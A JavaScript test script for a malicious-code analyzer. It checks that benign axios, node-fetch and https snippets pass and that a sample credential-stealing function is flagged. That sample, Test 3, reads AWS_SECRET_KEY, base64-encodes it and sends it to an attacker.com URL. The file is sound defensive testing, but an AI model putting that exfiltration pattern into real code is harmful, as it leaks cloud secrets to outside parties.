import { analyzeContent } from './src/analyzer.js';

// Test 1: Legitimate axios usage (should not be flagged)
const legitimateAxios = `
import axios from 'axios';

async function getApiData() {
  const baseUrl = process.env.API_URL || 'https://api.example.com';
  const response = await axios.get(\`\${baseUrl}/data\`, {
    params: { id: 123 }
  });
  return response.data;
}
`;

// Test 2: Legitimate node-fetch usage (should not be flagged)
const legitimateFetch = `
import fetch from 'node-fetch';

async function postData() {
  const apiUrl = 'https://api.github.com/repos/counterspec/isnad/issues';
  const response = await fetch(apiUrl, {
    method: 'POST',
    body: JSON.stringify({ title: 'Test' })
  });
  return response.json();
}
`;

// Test 3: Malicious exfiltration (should still be flagged)
const maliciousExfil = `
import fetch from 'node-fetch';

async function stealData() {
  const apiKey = process.env.AWS_SECRET_KEY;
  const encoded = Buffer.from(apiKey).toString('base64');
  await fetch(\`https://attacker.com/steal?key=\${encoded}\`);
}
`;

// Test 4: Legitimate urllib3/python style (converted to JS for test)
const legitimateUrllib = `
const https = require('https');

function getWeather() {
  const options = {
    hostname: 'api.openweathermap.org',
    path: '/data/2.5/weather?q=London',
    method: 'GET'
  };
  
  const req = https.request(options, (res) => {
    // handle response
  });
  
  req.end();
}
`;

console.log("Testing legitimate axios usage:");
const result1 = analyzeContent(legitimateAxios);
console.log(`Findings: ${result1.summary.total}, Risk level: ${result1.riskLevel}`);
console.log("Findings:", result1.findings.map(f => f.patternId));
console.log("\n---\n");

console.log("Testing legitimate node-fetch usage:");
const result2 = analyzeContent(legitimateFetch);
console.log(`Findings: ${result2.summary.total}, Risk level: ${result2.riskLevel}`);
console.log("Findings:", result2.findings.map(f => f.patternId));
console.log("\n---\n");

console.log("Testing malicious exfiltration:");
const result3 = analyzeContent(maliciousExfil);
console.log(`Findings: ${result3.summary.total}, Risk level: ${result3.riskLevel}`);
console.log("Findings:", result3.findings.map(f => f.patternId));
console.log("\n---\n");

console.log("Testing legitimate urllib3/https usage:");
const result4 = analyzeContent(legitimateUrllib);
console.log(`Findings: ${result4.summary.total}, Risk level: ${result4.riskLevel}`);
console.log("Findings:", result4.findings.map(f => f.patternId));
